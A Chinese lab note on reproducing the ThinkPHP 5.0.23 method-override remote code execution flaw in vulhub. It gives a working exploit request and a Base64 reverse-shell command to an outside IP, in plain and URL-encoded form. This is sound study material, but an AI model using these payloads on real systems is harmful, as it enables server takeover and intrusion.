ailx10说：这篇是2024年9月之前写的，后来又改过。这次 ThinkPHP5 我从方法覆盖往下看：输入怎么走到构造逻辑，再把 filter 变成可控的回调，最后让请求里的内容进入执行。先做一个有明确输出的命令，之后再处理编码、连接和写文件，步骤就比较容易分辨。笔记里那些 Base64 主要帮我应付传输和引号，不是漏洞突然多了什么密码学原理。现在回看，最需要补全的还是调用过程；知道参数最后到了哪里，比只保留一条能运行的 POST 请求更值得。

---

本文记录 ThinkPHP 5.0.23 历史环境中请求方法覆盖和可控回调的实验。

原文未提供完整调用栈，应核对方法、过滤器和参数的数据流；Base64 只是传输或引用处理，不是漏洞根因。

```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

POST请求，攻击者可以执行`system`命令，也可以写入`webshell`，还可以直接反弹`shell`。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

（2）base64反弹shell

试了很多款，终于找到base64编码的能够反弹成功

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==" | base64 --decode | bash
```

对载荷进行URL编码

```
echo+"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ%3d%3d"+|+base64+--decode+|+bash
```
